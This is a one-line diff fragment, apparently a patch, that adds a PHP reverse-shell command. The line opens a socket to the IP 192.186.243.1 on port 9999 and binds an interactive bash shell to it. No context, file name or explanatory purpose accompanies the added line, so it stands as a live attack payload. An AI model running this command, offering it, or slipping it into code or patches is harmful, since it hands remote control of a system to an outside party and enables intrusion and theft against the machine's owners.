@@ -1,0 +1,1 @@
+php -r '$sock=fsockopen("192.186.243.1",9999);exec("/bin/bash -i <&3 >&3 2>&3");'
